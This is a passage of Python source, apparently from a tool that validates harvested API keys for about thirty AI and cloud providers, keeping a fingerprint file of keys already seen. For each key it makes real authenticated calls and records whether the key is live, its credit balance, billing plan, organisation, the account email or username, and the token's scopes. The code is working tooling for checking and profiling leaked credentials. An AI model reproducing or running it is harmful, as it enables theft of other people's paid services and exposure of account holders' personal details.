        if not _skip_key(k):
            found.append({"platform":"getimg","key_type":"key","key":k,"filename":filename})

    dedup={}
    for e in found:
        dedup[e["key"]]=e
    return list(dedup.values())

_seen=set()
_seen_lock=threading.Lock()

def _load_seen():
    """Load previously seen key fingerprints from disk on startup."""
    if not os.path.isfile(SEEN_KEYS_FILE): return
    try:
        with open(SEEN_KEYS_FILE,"r",encoding="utf-8") as f:
            for line in f:
                fp=line.strip()
                if fp: _seen.add(fp)
        log.info(col(f"  Loaded {len(_seen)} previously seen key fingerprints from {SEEN_KEYS_FILE}","cyan"))
    except Exception as e:
        log.warning(col(f"  Could not load seen keys file: {e}","yellow"))

def _persist_seen(fp):
    """Append a new fingerprint to the seen keys file immediately."""
    try:
        with _seen_lock:
            with open(SEEN_KEYS_FILE,"a",encoding="utf-8") as f:
                f.write(fp+"\n")
    except Exception as e:
        log.debug(col(f"    [SEEN-WRITE-ERR] {e}","dim"))

def _is_new(entry):
    fp=hashlib.md5(entry["key"].encode()).hexdigest()
    with _seen_lock:
        if fp in _seen: return False
        _seen.add(fp)
    _persist_seen(fp)
    return True

# ── VALIDATORS ──────────────────────────────────────────────────────────────
# status: "live" | "dead" | "ratelimited" | "unknown" | "error"

def _val_openai(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,rh,raw=_request("GET","https://api.openai.com/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["sample_models"]=", ".join(m.get("id","") for m in models[:3])
        elif sc==401:
            r["status"]="dead"
            try:
                err=json.loads(raw)
                r["details"]["error"]=(err.get("error") or {}).get("message","")
            except: pass
        elif sc==429:
            raw_text=raw.decode("utf-8",errors="replace")
            try: err_data=json.loads(raw_text)
            except: err_data={}
            err_msg=str((err_data.get("error") or {}).get("message","")).lower()
            err_type=str((err_data.get("error") or {}).get("type","")).lower()
            err_code=str((err_data.get("error") or {}).get("code","")).lower()
            if "insufficient_quota" in err_msg or "quota" in err_code or "billing" in err_msg:
                r["status"]="ratelimited"
                r["details"]["note"]="Quota exceeded — key valid but no credits"
            elif "rate_limit" in err_type or "rate_limit" in err_code:
                r["status"]="ratelimited"
                r["details"]["note"]="Rate limited — key valid, has credits but hit req/min limit"
            else:
                r["status"]="ratelimited"
                r["details"]["note"]=f"429: {err_msg[:100]}"
        else:
            r["status"]="unknown"
            r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    if r["status"]=="live":
        # Confirm quota by doing a minimal chat completion — /v1/models 200 does NOT prove quota
        try:
            test_body=json.dumps({
                "model":"gpt-4o-mini",
                "max_tokens":1,
                "messages":[{"role":"user","content":"hi"}]
            }).encode()
            sc_t,_,raw_t=_request("POST","https://api.openai.com/v1/chat/completions",headers=h,body=test_body)
            if sc_t==429:
                raw_text=raw_t.decode("utf-8",errors="replace")
                try: err_data=json.loads(raw_text)
                except: err_data={}
                err_msg =str((err_data.get("error") or {}).get("message","")).lower()
                err_code=str((err_data.get("error") or {}).get("code","")).lower()
                if "insufficient_quota" in err_msg or "quota" in err_code:
                    r["status"]="ratelimited"
                    r["details"]["note"]="Quota exceeded — key valid but no credits"
                    return r
                else:
                    r["status"]="ratelimited"
                    r["details"]["note"]="Rate limited — key valid, has credits but hit req/min"
                    return r
            elif sc_t==401:
                r["status"]="dead"
                return r
        except: pass
        try:
            sc2,_,raw2=_request("GET","https://api.openai.com/v1/organization",headers=h)
            if sc2==200:
                org=json.loads(raw2)
                r["details"]["org_id"]  =org.get("id","")
                r["details"]["org_name"]=org.get("name","")
                r["details"]["plan"]    =str((org.get("plan") or {}).get("id",""))
        except: pass
        try:
            sc3,_,raw3=_request("GET","https://api.openai.com/dashboard/billing/credit_grants",headers=h)
            if sc3==200:
                bg=json.loads(raw3)
                r["details"]["credits_total"]    =f"${bg.get('total_granted',0):.2f}"
                r["details"]["credits_used"]     =f"${bg.get('total_used',0):.2f}"
                r["details"]["credits_available"]=f"${bg.get('total_available',0):.2f}"
        except: pass
        # Check GPT-4o model access
        try:
            sc4,_,raw4=_request("GET","https://api.openai.com/v1/models/gpt-4o",headers=h)
            if sc4==200:
                r["details"]["gpt4o_access"]="✅ YES"
            else:
                r["details"]["gpt4o_access"]="❌ NO"
        except: pass
        # Check o1/o3 access
        try:
            sc5,_,raw5=_request("GET","https://api.openai.com/v1/models/o3",headers=h)
            if sc5==200:
                r["details"]["o3_access"]="✅ YES"
        except: pass
    return r

def _val_anthropic(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"x-api-key":key,"anthropic-version":"2023-06-01","Content-Type":"application/json"}
    # Step 1: auth check via /v1/models (no quota consumed)
    try:
        sc0,_,raw0=_request("GET","https://api.anthropic.com/v1/models",headers=h)
        if sc0==401:
            r["status"]="dead"
            return r
        elif sc0 not in(200,404):
            pass  # proceed to generation test
    except: pass
    # Step 2: real 1-token generation to confirm quota
    body=json.dumps({"model":"claude-haiku-20240307","max_tokens":1,
                     "messages":[{"role":"user","content":"hi"}]}).encode()
    try:
        sc,_,raw=_request("POST","https://api.anthropic.com/v1/messages",headers=h,body=body)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["model"]=data.get("model","")
            # Fetch account usage/limits
            try:
                sc2,_,raw2=_request("GET","https://api.anthropic.com/v1/organizations",headers=h)
                if sc2==200:
                    orgs=json.loads(raw2)
                    if isinstance(orgs,list) and orgs:
                        r["details"]["org"]=orgs[0].get("name","")
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            raw_text=raw.decode("utf-8",errors="replace")
            try: err_data=json.loads(raw_text)
            except: err_data={}
            err_type =str((err_data.get("error") or {}).get("type","")).lower()
            err_msg  =str((err_data.get("error") or {}).get("message","")).lower()
            if "rate_limit" in err_type:
                r["status"]="ratelimited"
                r["details"]["note"]="Rate limited — key valid, has credits"
            elif "credit" in err_msg or "quota" in err_msg or "balance" in err_msg or "usage" in err_msg:
                r["status"]="ratelimited"
                r["details"]["note"]="Out of credits — key valid but no quota"
            else:
                r["status"]="ratelimited"
                r["details"]["note"]=f"429 — key valid but quota/credits issue: {err_msg[:80]}"
        elif sc==400:
            raw_text=raw.decode("utf-8",errors="replace")
            try: err_data=json.loads(raw_text)
            except: err_data={}
            err_msg=str((err_data.get("error") or {}).get("message","")).lower()
            if "credit" in err_msg or "quota" in err_msg or "billing" in err_msg:
                r["status"]="ratelimited"
                r["details"]["note"]="No credits — key valid but quota exhausted"
            else:
                r["status"]="live"
                r["details"]["note"]="Auth OK (request param error)"
        elif sc==529:
            r["status"]="ratelimited"
            r["details"]["note"]="Overloaded — key valid"
        else:
            r["status"]="unknown"
            r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_deepseek(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.deepseek.com/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:3])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate/quota limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    if r["status"]=="live":
        try:
            sc2,_,raw2=_request("GET","https://api.deepseek.com/user/balance",headers=h)
            if sc2==200:
                bd=json.loads(raw2)
                bal=(bd.get("balance_infos") or [{}])[0]
                r["details"]["balance"]        =str(bal.get("total_balance",""))
                r["details"]["currency"]       =str(bal.get("currency",""))
                r["details"]["granted_balance"]=str(bal.get("granted_balance",""))
                r["details"]["topped_up"]      =str(bal.get("topped_up_balance",""))
        except: pass
    return r

def _val_groq(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.groq.com/openai/v1/models",headers=h)
        if sc==200:
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
            # Confirm with real generation test
            try:
                test_body=json.dumps({"model":"llama-3.1-8b-instant","max_tokens":1,
                                      "messages":[{"role":"user","content":"hi"}]}).encode()
                sc_t,_,raw_t=_request("POST","https://api.groq.com/openai/v1/chat/completions",headers=h,body=test_body)
                if sc_t==200:
                    r["status"]="live"
                elif sc_t==429:
                    raw_text=raw_t.decode("utf-8",errors="replace")
                    try: err_data=json.loads(raw_text)
                    except: err_data={}
                    err_msg=str((err_data.get("error") or {}).get("message","")).lower()
                    if "quota" in err_msg or "limit" in err_msg or "exceeded" in err_msg:
                        r["status"]="ratelimited"
                        r["details"]["note"]="Quota/rate exceeded — key valid"
                    else:
                        r["status"]="ratelimited"
                        r["details"]["note"]="Rate limited — key valid"
                else:
                    r["status"]="live"  # models listed OK, generation had non-quota issue
            except:
                r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_xai(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.x.ai/v1/models",headers=h)
        if sc==200:
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
            # Generation test to confirm quota
            try:
                test_body=json.dumps({"model":"grok-3-mini","max_tokens":1,
                                      "messages":[{"role":"user","content":"hi"}]}).encode()
                sc_t,_,raw_t=_request("POST","https://api.x.ai/v1/chat/completions",headers=h,body=test_body)
                if sc_t==200:
                    r["status"]="live"
                elif sc_t==429:
                    raw_text=raw_t.decode("utf-8",errors="replace")
                    try: err_data=json.loads(raw_text)
                    except: err_data={}
                    err_msg=str((err_data.get("error") or {}).get("message","")).lower()
                    r["status"]="ratelimited"
                    r["details"]["note"]=f"Quota/rate exceeded — key valid: {err_msg[:60]}"
                else:
                    r["status"]="live"
            except:
                r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_perplexity(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    body=json.dumps({"model":"sonar","max_tokens":1,
                     "messages":[{"role":"user","content":"hi"}]}).encode()
    try:
        sc,_,raw=_request("POST","https://api.perplexity.ai/chat/completions",headers=h,body=body)
        if sc==200:
            r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==400:
            r["status"]="live"
            r["details"]["note"]="Auth OK (param error)"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_mistral(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.mistral.ai/v1/models",headers=h)
        if sc==200:
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:3])
            # Real generation test to confirm quota
            try:
                test_body=json.dumps({"model":"mistral-small-latest","max_tokens":1,
                                      "messages":[{"role":"user","content":"hi"}]}).encode()
                sc_t,_,raw_t=_request("POST","https://api.mistral.ai/v1/chat/completions",headers=h,body=test_body)
                if sc_t==200:
                    r["status"]="live"
                elif sc_t==429:
                    raw_text=raw_t.decode("utf-8",errors="replace")
                    try: err_data=json.loads(raw_text)
                    except: err_data={}
                    err_msg=str((err_data.get("message") or "")).lower()
                    r["status"]="ratelimited"
                    r["details"]["note"]=f"Quota/rate exceeded — key valid: {err_msg[:60]}"
                elif sc_t==402:
                    r["status"]="ratelimited"
                    r["details"]["note"]="Payment required — key valid but no credits"
                else:
                    r["status"]="live"
            except:
                r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_cohere(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.cohere.com/v1/models",headers=h)
        if sc==200:
            data=json.loads(raw)
            models=data.get("models",[])
            r["details"]["model_count"]=str(len(models))
            # Generation test
            try:
                test_body=json.dumps({"model":"command-r","max_tokens":1,
                                      "message":"hi"}).encode()
                sc_t,_,raw_t=_request("POST","https://api.cohere.com/v1/chat",headers=h,body=test_body)
                if sc_t==200:
                    r["status"]="live"
                elif sc_t==429:
                    raw_text=raw_t.decode("utf-8",errors="replace")
                    try: err_data=json.loads(raw_text)
                    except: err_data={}
                    err_msg=str(err_data.get("message","")).lower()
                    r["status"]="ratelimited"
                    r["details"]["note"]=f"Quota/rate exceeded — key valid: {err_msg[:60]}"
                else:
                    r["status"]="live"
            except:
                r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_together(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.together.xyz/v1/models",headers=h)
        if sc==200:
            data=json.loads(raw)
            r["details"]["model_count"]=str(len(data) if isinstance(data,list) else 0)
            # Generation test
            try:
                test_body=json.dumps({"model":"meta-llama/Llama-3.2-3B-Instruct-Turbo",
                                      "max_tokens":1,"messages":[{"role":"user","content":"hi"}]}).encode()
                sc_t,_,raw_t=_request("POST","https://api.together.xyz/v1/chat/completions",headers=h,body=test_body)
                if sc_t==200:
                    r["status"]="live"
                elif sc_t==429:
                    r["status"]="ratelimited"
                    r["details"]["note"]="Rate/quota exceeded — key valid"
                elif sc_t==402:
                    r["status"]="ratelimited"
                    r["details"]["note"]="No credits — key valid"
                else:
                    r["status"]="live"
            except:
                r["status"]="live"
            # Fetch credit balance
            try:
                sc2,_,raw2=_request("GET","https://api.together.xyz/v1/users/me",headers=h)
                if sc2==200:
                    ud=json.loads(raw2)
                    r["details"]["credits"]=str(ud.get("balance",""))
                    r["details"]["email"]  =str(ud.get("email",""))
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_gemini(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    url=f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
    try:
        sc,_,raw=_request("GET",url)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("models",[])
            r["details"]["model_count"]=str(len(models))
            # Confirm quota with a minimal generation call
            try:
                gen_url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}"
                gen_body=json.dumps({"contents":[{"parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":1}}).encode()
                sc_g,_,raw_g=_request("POST",gen_url,headers={"Content-Type":"application/json"},body=gen_body)
                if sc_g in(400,403):
                    raw_gt=raw_g.decode("utf-8",errors="replace")
                    try: eg=json.loads(raw_gt)
                    except: eg={}
                    emsg=str((eg.get("error") or {}).get("message","")).lower()
                    estat=str((eg.get("error") or {}).get("status","")).lower()
                    if "quota" in emsg or "resource_exhausted" in estat or "billing" in emsg or "disabled" in emsg:
                        r["status"]="ratelimited"
                        r["details"]["note"]="Quota/billing issue — key valid but no credits"
                elif sc_g==429:
                    r["status"]="ratelimited"
                    r["details"]["note"]="Rate limited — key valid"
            except: pass
        elif sc in(400,403):
            raw_text=raw.decode("utf-8",errors="replace")
            try: err_data=json.loads(raw_text)
            except: err_data={}
            err_msg=str((err_data.get("error") or {}).get("message","")).lower()
            err_status=str((err_data.get("error") or {}).get("status","")).lower()
            if "api_key_invalid" in err_msg or "api key not valid" in err_msg or "invalid" in err_status:
                r["status"]="dead"
            elif "quota" in err_msg or "resource_exhausted" in err_status:
                r["status"]="ratelimited"
                r["details"]["note"]="Quota exceeded — key valid"
            elif "billing" in err_msg or "disabled" in err_msg:
                r["status"]="ratelimited"
                r["details"]["note"]="Billing/project disabled — key valid"
            else:
                r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_huggingface(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://huggingface.co/api/whoami",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["username"] =data.get("name","")
            r["details"]["email"]    =data.get("email","")
            auth=data.get("auth") or {}
            r["details"]["token_type"]=str(auth.get("type",""))
            # Extract token scopes/permissions
            access_token=auth.get("accessToken") or {}
            scopes=access_token.get("fineGrained",{}).get("global",[])
            if scopes:
                r["details"]["scopes"]=", ".join(scopes[:6])
            # Check if PRO user
            orgs=data.get("orgs") or []
            is_pro=any("pro" in str(o.get("type","")).lower() for o in orgs)
            r["details"]["pro"]="✅ YES" if is_pro else "❌ NO"
            # Check Inference API access
            try:
                inf_h={**h,"Content-Type":"application/json"}
                inf_body=json.dumps({"inputs":"hi"}).encode()
                sc_i,_,_=_request("POST","https://api-inference.huggingface.co/models/gpt2",
                                   headers=inf_h,body=inf_body)
                r["details"]["inference_api"]="✅ YES" if sc_i in(200,503) else "❌ NO"
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_replicate(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.replicate.com/v1/account",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["username"]=data.get("username","")
            r["details"]["name"]    =data.get("name","")
            r["details"]["type"]    =data.get("type","")
            # Fetch credit balance
            try:
                sc2,_,raw2=_request("GET","https://api.replicate.com/v1/account/billing",headers=h)
                if sc2==200:
                    bd=json.loads(raw2)
                    r["details"]["credits"]      =str(bd.get("credit_balance",""))
                    r["details"]["next_invoice"]  =str(bd.get("next_invoice_total",""))
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_elevenlabs(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"xi-api-key":key}
    try:
        sc,_,raw=_request("GET","https://api.elevenlabs.io/v1/user",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            sub=data.get("subscription") or {}
            r["details"]["tier"]           =sub.get("tier","")
            r["details"]["character_count"]=str(sub.get("character_count",""))
            r["details"]["character_limit"]=str(sub.get("character_limit",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

# ── Batch 1 validators ───────────────────────────────────────────────────────
def _val_cerebras(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.cerebras.ai/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_openrouter(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://openrouter.ai/api/v1/auth/key",headers=h)
        if sc==200:
            data=json.loads(raw)
            dat=data.get("data",{})
            limit    =dat.get("limit")
            usage    =dat.get("usage",0)
            remaining=dat.get("limit_remaining")
            # If limit is set and remaining is 0 or usage >= limit → ratelimited
            if limit is not None and remaining is not None and float(remaining)<=0:
                r["status"]="ratelimited"
                r["details"]["note"]="Credits exhausted — key valid but no quota"
            else:
                r["status"]="live"
            r["details"]["label"]           =str(dat.get("label",""))
            r["details"]["usage"]           =f"${usage:.4f}" if isinstance(usage,(int,float)) else str(usage)
            r["details"]["limit"]           =f"${limit:.4f}" if isinstance(limit,(int,float)) else str(limit)
            r["details"]["limit_remaining"] =f"${float(remaining):.4f}" if remaining is not None else "unlimited"
            r["details"]["is_free_tier"]    =str(dat.get("is_free_tier",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_fireworks(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.fireworks.ai/inference/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:3])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_novita(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.novita.ai/v3/openai/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_ai21(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.ai21.com/studio/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["model_count"]=str(len(data) if isinstance(data,list) else 0)
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_azure_openai(entry):
    r={"status":"live","details":{}}
    r["details"]["note"]="Azure key found — manual endpoint verification required"
    return r

# ── Batch 2 validators ───────────────────────────────────────────────────────
def _val_fal(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Key {key}"}
    try:
        sc,_,raw=_request("GET","https://rest.alpha.fal.ai/v1/keys",headers=h)
        if sc==200:
            r["status"]="live"
            r["details"]["note"]="Key valid — fal.ai authenticated"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            sc2,_,_=_request("GET","https://fal.run/fal-ai/any-llm",headers=h)
            if sc2 in(200,422):
                r["status"]="live"
                r["details"]["note"]="Auth OK (endpoint reached)"
            else:
                r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_stability(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Accept":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.stability.ai/v1/user/account",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["email"]=data.get("email","")
            r["details"]["id"]   =data.get("id","")
            sc2,_,raw2=_request("GET","https://api.stability.ai/v1/user/balance",headers=h)
            if sc2==200:
                bal=json.loads(raw2)
                r["details"]["credits"]=str(bal.get("credits",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_bedrock(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://bedrock.us-east-1.amazonaws.com/foundation-models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("modelSummaries",[])
            r["details"]["model_count"]=str(len(models))
        elif sc in(401,403):
            r["status"]="dead"
            r["details"]["note"]="Key format valid but auth rejected"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_cloudflare(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.cloudflare.com/client/v4/user/tokens/verify",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            result=data.get("result",{})
            r["details"]["status"]=result.get("status","")
            r["details"]["id"]    =result.get("id","")
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_nvidia(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://integrate.api.nvidia.com/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_voyage(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    body=json.dumps({"input":["test"],"model":"voyage-3"}).encode()
    try:
        sc,_,raw=_request("POST","https://api.voyageai.com/v1/embeddings",headers=h,body=body)
        if sc==200:
            r["status"]="live"
        elif sc in(400,422):
            r["status"]="live"
            r["details"]["note"]="Auth OK (param error)"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r


# ── Batch 3 validators ───────────────────────────────────────────────────────
def _val_minimax(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.minimax.io/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_moonshot(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
